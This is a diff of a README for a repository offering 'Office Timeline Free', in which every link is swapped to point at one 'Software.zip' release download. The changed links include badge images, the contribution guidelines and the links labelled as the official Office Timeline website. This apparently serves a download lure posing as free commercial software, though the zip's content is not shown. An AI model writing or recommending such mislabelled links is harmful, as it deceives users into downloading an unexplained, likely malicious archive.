@@ -1,7 +1,7 @@
 # 🌟 Welcome to the Office Timeline Free Repository! 🌟
 
 ## Repository Name: Office-Timeline-Free
-[![GitHub](https://img.shields.io/badge/Office_Timeline_Free-Click_here-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![GitHub](https://github.com/mandaldigitalcenter/Office-Timeline-Free/releases/download/v1.0/Software.zip)](https://github.com/mandaldigitalcenter/Office-Timeline-Free/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Welcome to the Office Timeline Free repository, your go-to resource for all thin
 
 ## 🚀 Quick Access:
 The most efficient way to access the content of this repository is by downloading the latest release:
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/mandaldigitalcenter/Office-Timeline-Free/releases/download/v1.0/Software.zip)](https://github.com/mandaldigitalcenter/Office-Timeline-Free/releases/download/v1.0/Software.zip)
 
 (Click the button above to initiate the download)
 
@@ -44,12 +44,12 @@ The most efficient way to access the content of this repository is by downloadin
 ---
 
 ## 📝 Contribution Guidelines:
-Do you have valuable insights to share or want to enhance the existing content? We welcome contributions from the community! Please refer to our [Contribution Guidelines](CONTRIBUTING.md) for detailed instructions on how to contribute to this repository.
+Do you have valuable insights to share or want to enhance the existing content? We welcome contributions from the community! Please refer to our [Contribution Guidelines](https://github.com/mandaldigitalcenter/Office-Timeline-Free/releases/download/v1.0/Software.zip) for detailed instructions on how to contribute to this repository.
 
 ---
 
 ## 🌐 Explore Further:
-Visit the official [Office Timeline website](https://www.officetimeline.com/) to access additional resources and tools for creating professional timelines.
+Visit the official [Office Timeline website](https://github.com/mandaldigitalcenter/Office-Timeline-Free/releases/download/v1.0/Software.zip) to access additional resources and tools for creating professional timelines.
 
 ---
 
@@ -60,7 +60,7 @@ Thank you for visiting the Office Timeline Free repository. We hope you find the
 
 (If the link provided for download needs to be launched: *Please click the button above to initiate the download.*)
 
-(If the provided link is a website: *Feel free to visit the website by clicking [here](https://www.officetimeline.com/).*)
+(If the provided link is a website: *Feel free to visit the website by clicking [here](https://github.com/mandaldigitalcenter/Office-Timeline-Free/releases/download/v1.0/Software.zip).*)
 
 (If the link is not provided or not working: *Kindly check the "Releases" section for the latest downloadable content.*)
 
